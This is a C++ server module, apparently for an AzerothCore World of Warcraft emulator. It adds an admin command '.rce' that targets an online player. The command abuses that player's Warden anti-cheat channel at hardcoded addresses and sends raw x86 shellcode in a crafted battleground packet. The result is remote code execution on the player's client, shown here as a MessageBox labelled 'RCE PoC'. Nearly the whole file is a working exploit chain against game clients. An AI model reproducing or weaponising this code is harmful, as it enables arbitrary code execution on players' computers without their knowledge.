#include "ScriptMgr.h"
#include "Chat.h"
#include "Player.h"
#include "WorldSession.h"
#include "ByteBuffer.h"
#include "WorldPacket.h"
#include "ObjectAccessor.h"
#include "WardenWin.h"

using namespace Acore::ChatCommands;

class RCECommandScript : public CommandScript
{
public:
    RCECommandScript() : CommandScript("RCECommandScript") {}

    ChatCommandTable GetCommands() const override
    {
        static ChatCommandTable commandTable =
        {
            { "rce", HandleRCECommand, SEC_ADMINISTRATOR, Console::No }
        };
        return commandTable;
    }

    static bool HandleRCECommand(ChatHandler* handler, std::string const& playerName)
    {
        if (playerName.empty())
        {
            handler->SendSysMessage("Usage: .rce <charactername>");
            handler->SetSentErrorMessage(true);
            return false;
        }

        std::string name = playerName;
        if (!normalizePlayerName(name))
        {
            handler->SendSysMessage("Invalid player name.");
            handler->SetSentErrorMessage(true);
            return false;
        }

        Player* target = ObjectAccessor::FindPlayerByName(name);
        if (!target)
        {
            handler->PSendSysMessage("Player '{}' not found or not online.", name.c_str());
            handler->SetSentErrorMessage(true);
            return false;
        }

        WorldSession* session = target->GetSession();
        if (!session)
        {
            handler->SendSysMessage("Could not retrieve session for target player.");
            handler->SetSentErrorMessage(true);
            return false;
        }

        WardenWin* warden = dynamic_cast<WardenWin*>(session->GetWarden());
        if (!warden)
        {
            handler->SendSysMessage("Could not retrieve Warden instance for target player.");
            handler->SetSentErrorMessage(true);
            return false;
        }

        warden->Exploit(0x14E720);

        const uint8_t loader[] = { 0x68,0x00,0x00,0x00,0x00,0x68,0x19,0x10,0xDD,0x00,0x68,0x1F,0x10,0xDD,0x00,0x6A,0x00,0xFF,0x15,0xCC,0xF5,0x9D,0x00,0xEB,0xFE,0x50,0x72,0x6F,0x6F,0x66,0x00,0x52,0x43,0x45,0x20,0x50,0x6F,0x43,0x00,0xC3 };
        const uint8_t payload[] = { 0x00 };

        constexpr size_t loader_size = sizeof(loader);
        constexpr size_t loader_padded_size = (loader_size + 7) & ~size_t(7);
        int32_t loader_count = static_cast<int32_t>(loader_padded_size);

        constexpr size_t payload_size = sizeof(payload);

        ByteBuffer buff2;
        buff2 << uint32(0);
        buff2 << uint32(249298 + (loader_count / 8));
        while (loader_count > 0) {
            for (int32_t i = 0; i < 8; i++)
            {
                size_t idx = loader_count - 8 + i;
                buff2 << (idx < loader_size ? loader[idx] : uint8_t(0));
            }

            for (int32_t i = 0; i < 8; i++)
            {
                size_t idx = loader_count - 8 + i;
                buff2 << (idx < payload_size ? payload[idx] : uint8_t(0));
            }

            loader_count -= 8;
        }

        WorldPacket pkt3(MSG_BATTLEGROUND_PLAYER_POSITIONS, buff2.size());
        pkt3.append(buff2);
        session->SendPacket(&pkt3);

        warden->Exploit(0x009D1000);

        handler->PSendSysMessage("MessageBox payload dispatched to '{}' via Warden exploit.", name.c_str());
        return true;
    }
};

void Addmod_rceScripts()
{
    new RCECommandScript();
}
